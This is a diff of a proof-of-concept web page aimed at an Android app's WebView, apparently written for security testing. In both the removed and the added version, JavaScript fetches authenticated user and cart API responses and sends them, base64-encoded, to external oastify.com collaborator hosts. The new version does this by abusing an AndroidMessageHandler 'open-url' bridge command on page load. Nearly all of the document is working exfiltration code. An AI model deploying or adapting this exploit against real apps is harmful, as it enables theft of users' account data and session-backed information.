@@ -1,67 +1,13 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <title>WebView PoC</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
-<body>
-<h2>SINARPAGI PoC</h2>
-
 <script>
-(function() {
-    const COLLAB = "https://l5rnopwoftdor2dy5b0mrmotvk1fp7dw.oastify.com";
-
-    function log(msg) {
-        new Image().src = COLLAB + "/?log=" + encodeURIComponent(msg);
+  // This script will run as soon as the Oda app loads this page
+  function exploit() {
+    if (window.AndroidMessageHandler) {
+      AndroidMessageHandler.postMessage(JSON.stringify({
+        command: "open-url",
+        url: "https://oda.com/api/v1/user/refresh",
+        callbackString: "fetch('/api/v1/user/refresh', {credentials:'include'}).then(r=>r.text()).then(d=>{new Image().src='https://3125k7s6bb96nk9g1tw4n4kbr2xxlq9f.oastify.com/?data='+btoa(d);});"
+      }));
     }
-
-    function exfil(data) {
-        new Image().src = COLLAB + "/?data=" + btoa(data);
-    }
-
-    try {
-        log("POC_LOADED");
-
-        // Step 1: cek apakah ini dalam WebView
-        if (navigator.userAgent.includes("wv")) {
-            log("WEBVIEW_DETECTED");
-        } else {
-            log("NOT_WEBVIEW");
-        }
-
-        // Step 2: ambil data user
-        fetch("/api/v1/user/refresh/", {
-            method: "GET",
-            credentials: "include"
-        })
-        .then(res => res.text())
-        .then(data => {
-            log("API_RESPONSE_RECEIVED");
-            exfil(data);
-        })
-        .catch(err => {
-            log("FETCH_ERROR:" + err);
-        });
-
-        // Step 3: fallback (kadang endpoint beda)
-        fetch("/api/v1/cart/", {
-            method: "GET",
-            credentials: "include"
-        })
-        .then(res => res.text())
-        .then(data => {
-            log("FALLBACK_API_SUCCESS");
-            exfil(data);
-        })
-        .catch(err => {
-            log("FALLBACK_ERROR:" + err);
-        });
-
-    } catch(e) {
-        log("EXCEPTION:" + e);
-    }
-})();
+  }
+  window.onload = exploit;
 </script>
-
-</body>
-</html>
